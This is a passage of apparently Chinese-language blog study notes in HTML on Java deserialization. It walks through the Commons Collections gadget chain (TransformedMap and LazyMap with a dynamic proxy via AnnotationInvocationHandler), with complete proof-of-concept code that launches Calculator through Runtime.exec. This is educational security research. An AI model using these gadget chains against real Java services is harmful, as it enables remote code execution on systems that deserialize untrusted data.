class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;), (Transformer)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;), (Transformer)<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, (Object[])execArgs), (Transformer)<span class="keyword">new</span> ConstantTransformer(Integer.valueOf(<span class="number">1</span>)) &#125;;</span><br><span class="line">Map&lt;Object, Object&gt; innerMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, (Transformer)chainedTransformer);</span><br><span class="line">Map mapProxy = (Map)Gadgets.createMemoitizedProxy(lazyMap, Map.class, <span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line">InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">Reflections.setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure><p>通过源码我们可以看出，前面都和我们之前构造一样，只是这里是用的是<code>Map lazyMap = LazyMap.decorate(innerMap, (Transformer)chainedTransformer);</code>。而之前我们使用的是<code>Map outerMap = TransformedMap.decorate(innerMap,null, transformerChain );</code>，我们对比一下两者有什么区别</p><p>那我们都知道，我们使用<code>TransformedMap</code>的主要目的是去触发<code>transform()</code>,前面<code>TransformedMap</code>是在往<code>Map</code>中添加元素时触发的，但是<code>lazyMap</code>是在<code>get</code>方法中触发的</p><p><img src="/2021/11/16/java_study/java_day5/image-20211116145948875.png" alt="image-20211116145948875"></p><p>我们注意到，这里并不是直接使用<code>get()</code>方法就可以触发，而是处理当我们去获取一个不存在的键时会触发该方法，所以我们的思路比较明确,我们只需要去获取一个不存在的<code>Map</code>即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">lazyMap.get(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用<code>TransformedMap</code>时，我们可以通过<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>readObject</code>去调用<code>put</code>方法，那么我们使用<code>lazyMap</code>时该如何去调用<code>get()</code>方法呢？</p><p>这里我们还是使用<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，但不是使用他的<code>readObject</code>，我们注意到，在它的<code>invoke</code>方法中使用到了<code>get()</code>方法</p><p><img src="/2021/11/16/java_study/java_day5/image-20211116151318371.png" alt="image-20211116151318371"></p><p>但是，我们这里是反序列化，不能直接使用方法去调用，我们要使用其他途径来调用这个方法</p><h3 id="Java对象代理"><a href="#Java对象代理" class="headerlink" title="Java对象代理"></a>Java对象代理</h3><p>按照P牛和ysoserial的方法，是使用到了对象代理</p><p>主要分为静态代理和动态代理，而我们这里是用到的是动态代理</p><blockquote><p>与静态代理类对照的是动态代理类，动态代理类的字节码在程序运行时由 Java 反射机制动态生成，无需程序员手工编写它的源代码。动态代理类不仅简化了编程工作，而且提高了软件系统的可扩展性，因为 Java 反射机制可以生成任意类型的动态代理类。<code>java.lang.reflect</code> 包中的 Proxy 类和<code>InvocationHandler</code> 接口提供了生成动态代理类的能力</p></blockquote><p>我们可以注意到<code>AnnotationInvocationHandler</code>刚好是实现了<code>InvocationHandler</code>，并且当我们去使用动态代理时会调用其中的<code>invoke</code>方法，我们跟随P牛来看个简单的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo_dl</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Demo_dl</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们实现了一个<code>InvocationHandler</code>并尝试通过代理的方式去调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Map test = <span class="keyword">new</span> HashMap();</span><br><span class="line">InvocationHandler invocationHandler = <span class="keyword">new</span> Demo_dl(test);</span><br><span class="line">Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">proxyMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">String result = (String) proxyMap.get(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><p>我们正常使用<code>get</code>方法获取的是对应键的值，那么这里我们做了个动态代理，新增了一个方法，当我们调用<code>get</code>方法时会返回<code>Hacked Object</code></p><p><img src="/2021/11/16/java_study/java_day5/image-20211117143118115.png" alt="image-20211117143118115"></p><p>实现的方法主要是下面两行代码，其中第二行代码是实现动态代理，一共传入三个参数</p><ul><li>loader：一个classloader对象，定义了由哪个classloader对象对生成的代理类进行加载</li><li>interfaces：一个interface对象数组，表示我们将要给我们的代理对象提供一组什么样的接口，如果我们提供了这样一个接口对象数组，那么也就是声明了代理类实现了这些接口，代理类就可以调用接口中声明的所有方法。</li><li>h：一个InvocationHandler对象，表示的是当动态代理对象调用方法的时候会关联到哪一个InvocationHandler对象上，并最终由其调用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler invocationHandler = <span class="keyword">new</span> Demo_dl(test);</span><br><span class="line">Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p>那么接下来我们就需要去实现我们的poc了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler  = (InvocationHandler)constructor.newInstance(Retention.class,lazyMap);</span><br><span class="line">Map test =  (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler)constructor.newInstance(Retention.class,test);</span><br><span class="line">FileOutputStream baos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectOutputStream oi = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">oi.writeObject(handler);</span><br><span class="line">oi.close();</span><br><span class="line">FileInputStream obj = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectInputStream obtest = <span class="keyword">new</span> ObjectInputStream(obj);</span><br><span class="line">obtest.readObject();</span><br><span class="line">obtest.close();</span><br></pre></td></tr></table></figure><p>在我们实现代理之后，又实现了一遍<code>handler</code>，这是因为最终我们实现反序列化的类是<code>AnnotationInvocationHandler</code>，如果我们没有实现这一步，你会发现我们实际只完成到了压缩<code>lazyMap</code>这一步，并没有将动态代理压缩到反序列化中</p>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java 学习日程（TransformedMap）</title>
      <link href="/2021/11/02/java_study/java_day4/"/>
      <url>/2021/11/02/java_study/java_day4/</url>
      
        <content type="html"><![CDATA[<h2 id="day4—反序列化-TransformedMap"><a href="#day4—反序列化-TransformedMap" class="headerlink" title="day4—反序列化(TransformedMap)"></a>day4—反序列化(TransformedMap)</h2><p>前面我们只介绍了如何利用某些类中的方法来执行命令，但是反序列化的关键在于如何将最后的对象生成为一个序列化流，也就是我们所需要的POC</p><p>我们说过当一个对象生成序列化流的时候会调用类中的<code>writeObject</code>方法，而反序列化的时候会调用<code>readObject</code>方法，那么我们就需要找到一个可以利用的类</p><p>我们编写一个序列化流的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, transformerChain,<span class="keyword">null</span> );</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj  = constructor.newInstance(Retention.class,outerMap);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oi = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oi.writeObject(obj);</span><br><span class="line">        oi.close();</span><br></pre></td></tr></table></figure><p>可以看到这次我们的<code>transformers</code>数组中没有直接去调用<code>Runtime.getRuntime()</code>，这是因为我们序列化的时候，所有调用到的类必须继承<code>Serializable</code>，<code>Runtime.getRuntime()</code>是一个<code>Runtime</code>类的对象，而<code>Runtime.class</code>是一个<code>java.lang.Class</code>的对象，而后者继承了<code>Serializable</code>，所以可以被序列化</p><p>那现在我们要理清楚<code>transformers</code>数组中的调用顺序，笔者开始学习时屡次放弃也正是因为看不懂调用反射的方式。</p><p>首先我们看一下正常的反射链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class runt = Runtime.class;  runt.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(runt.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(runt),<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们如果把它完整的写出来应该是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class runt = Runtime.class;</span><br><span class="line">Method method = runt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object exe = method.invoke(runt);</span><br><span class="line">Method methodExec = runt.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">methodExec.invoke(exe,<span class="string">&quot;ls&quot;</span>);</span><br></pre></td></tr></table></figure><p>第一步我们肯定要获得一个<code>Runtime.class</code>对象，所以我们使用<code>new ConstantTransformer(Runtime.class)</code>肯定是没问题的</p><p>按照传入顺序，这个时候我们需要去获取到一个<code>getRuntime</code>方法，这时候我们传入的是</p><p><code>new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;)</code></p><p>我们把他带入到<code>InvokerTransformer.transform</code>中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass(); <span class="comment">//Class cls = Runtime.class.getClass(); java.lang.Class</span></span><br><span class="line">Method method = cls.getMethod(iMethodName, iParamTypes); <span class="comment">//Method method = cls.getMethod(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;)</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs); <span class="comment">//method.invoke(Runtime.class,new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125; );</span></span><br></pre></td></tr></table></figure><p>这样就可以看出我们是利用反射去获取到了一个<code>getMethod</code>方法，并获取到了<code>getRuntime</code>这个时候我们相当于执行到了</p><p><code>runt.getMethod(&quot;getRuntime&quot;)</code>，这时候本质返回的还是一个Method对象</p><p>这个时候我们将返回值作为下一个输入的时候我们实际<code>getClass()</code>获取到的是</p><p><img src="/2021/11/02/java_study/java_day4/image-20211102113739646.png" alt="image-20211102113739646"></p><p>这个时候我们并不能直接去获取到<code>Runtime.getRuntime()</code>这个对象</p><p>接着我们继续跟</p><p><code>new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;)</code></p><p>这里去通过反射去获取一个<code>invoke</code>方法，并且没有传入参数，目前我也不太能理解这里面的机制，看了几遍文章都没有详细介绍，只知道这里可以将刚刚获取到<code>Method</code>转化为一个对象类似</p><p><code>Object obj = method.invoke(input)</code>，只是这里的method是<code>invoke</code></p><p>当我们执行完上面几步就相当于获取了一个<code>Runtime.getRuntime()</code>对象，再根据我们前文所介绍的获取<code>exec</code>方法即可</p><ul><li>Tips:<ul><li>大家可以看到上面很多参数是<code>new Class[0]</code> 或<code> new Object[0]</code>，其实就相当于<code>null</code>来占位</li></ul></li></ul><p>到这个时候我们刚刚把利用链补充完整，接着我们需要进行反序列化的介绍</p><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p>上面我们只换了一种方式去执行命令，但是我们知道最主要的还是反序列化，也就是将流转化为对象，那么我们就无法直接使用<code>outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code>去触发,我们知道当我们反序列化的时候会调用<code>readObject</code>方法</p><p>这里我们使用<code>AnnotationInvocationHandler</code>的<code>readObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet() </span><br><span class="line">memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br></pre></td></tr></table></figure><p><code>memberValue</code>是一个Map类型，并且我们输入的对象经过了<code>TransformedMap</code>的渲染，当我们去操作<code>Map</code>的时候就会触发<code>TransformedMap</code>的<code>Transform</code>方法，从而代替<code>Map.put()</code>的方式</p><p>那么我们该怎么去创建<code>AnnotationInvocationHandler</code>的对象呢，因为它是一个JDK内部类，所以无法直接去创建，这个时候我们就需要使用反射的方法，去拿到他的构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj  = constructor.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure><p>当我们拿到构造方法一共传入了两个参数</p><p><img src="/2021/11/02/java_study/java_day4/image-20211116140112733.png" alt="image-20211116140112733"></p><p>第二个参数我们很好理解，因为从刚才分析<code>readObject</code>方法我们得出的结论是，<code>memberValues</code>是经过<code>TransformedMap</code>修饰的对象，所以在这里应该是我们<code>Map outerMap = TransformedMap.decorate(innerMap,null, transformerChain );</code>中的<code>outerMap</code>，但是第一个参数我们不好去理解，看到P牛的文章说会涉及到Java注释相关的技术，所以P牛直接给出了两个条件，同时满足即可，主要目的是满足<code>readObject</code>的中 <code>if (memberType != null)</code>，这里直接贴出两个条件</p><blockquote><ol><li><p>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</p></li><li><p>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</p></li></ol></blockquote><p><img src="/2021/11/02/java_study/java_day4/image-20211116140715770.png" alt="image-20211116140715770"></p><p>我们可以看到<code>Retention.class</code>是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的子类，并且里面有一个<code>value()</code>方法，那么我们满足第二个条件即可，也就是我们需要把键名设置为<code>innerMap.put(&quot;value&quot;,&quot;test&quot;);</code></p><p>所以最终的poc为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">  <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>, transformerChain );</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj  = constructor.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">FileOutputStream baos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectOutputStream oi = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">oi.writeObject(obj);</span><br><span class="line">oi.close();</span><br><span class="line">FileInputStream test = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;Object&quot;</span>);</span><br><span class="line">ObjectInputStream obtest = <span class="keyword">new</span> ObjectInputStream(test);</span><br><span class="line">obtest.readObject();</span><br><span 